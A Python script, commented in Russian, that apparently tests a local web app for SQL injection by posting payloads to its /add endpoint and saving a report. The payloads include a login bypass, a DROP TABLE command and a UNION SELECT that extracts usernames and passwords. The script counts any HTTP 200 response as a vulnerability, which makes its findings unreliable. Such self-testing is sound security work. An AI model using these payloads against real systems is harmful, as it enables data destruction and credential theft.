import requests
import os
from datetime import datetime

# Устанавливаем базовый URL вашего сервера
base_url = 'http://127.0.0.1:5000'

# Список полезных нагрузок для тестирования SQL-инъекций
payloads = [
    "' OR '1'='1",  # Простая инъекция для обхода проверки
    "'; DROP TABLE user; --",  # Вредоносный запрос для удаления таблицы
    "'; SELECT * FROM user; --",  # Запрос для получения всех данных из таблицы
    "' UNION SELECT null, username, password FROM user --",  # Попытка извлечь данные из таблицы user
]

# Список полезных нагрузок для тестирования удаления данных
delete_payloads = [
    "' OR '1'='1",  # Простая инъекция для обхода проверки
    "'; DROP TABLE user; --",  # Вредоносный запрос для удаления таблицы
    "'; SELECT * FROM user; --",  # Запрос для получения всех данных из таблицы
]

# Функция для тестирования SQL инъекций
def test_sql_injection(payload, attack_type="normal"):
    data = {
        'username': payload,
        'email': 'test@example.com',
    }

    response = requests.post(f'{base_url}/add', data=data)
    
    return response, payload  # Возвращаем ответ сервера и полезную нагрузку

# Открытие файла отчета для записи
def generate_report():
    # Проверяем, существует ли папка для отчетов, и создаем, если ее нет
    report_dir = "Отчеты"
    if not os.path.exists(report_dir):
        os.makedirs(report_dir)

    total_tests = 0
    total_vulnerabilities = 0
    report_lines = []

    # Заголовок отчета
    report_lines.append("Отчет о тестировании SQL инъекций")
    report_lines.append("=" * 40)
    report_lines.append(f"Дата проверки: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    report_lines.append(f"Всего тестов: {len(payloads) + len(delete_payloads)}")

    # Тестирование
    for payload in payloads + delete_payloads:
        total_tests += 1
        response, payload = test_sql_injection(payload)

        print(f"Тестирование с полезной нагрузкой: {payload}")  # Выводим в консоль информацию о тесте

        if response.status_code == 200:  # Если уязвимость обнаружена
            total_vulnerabilities += 1
            print("[+] Уязвимость обнаружена.")  # Сообщаем о найденной уязвимости
            report_lines.append(f"\nПолезная нагрузка: {payload}")
            report_lines.append(f"Ответ сервера: {response.text[:500]}")  # Ограничим размер ответа для отчета
        else:
            print("[-] Уязвимость не обнаружена.")  # Сообщаем, если уязвимость не найдена
            report_lines.append(f"\nПолезная нагрузка: {payload}")
            report_lines.append("Ответ сервера: Уязвимость не обнаружена.")

    report_lines.append(f"\nВсего уязвимостей: {total_vulnerabilities}")
    report_lines.append("=" * 40)

    # Путь к файлу отчета
    report_file_path = os.path.join(report_dir, 'SQL_Отчет.txt')

    # Запись отчета в файл
    with open(report_file_path, 'w') as report_file:
        report_file.write("\n".join(report_lines))

    print(f"[INFO] Отчет сохранен в: {report_file_path}")

# Запуск отчета
generate_report()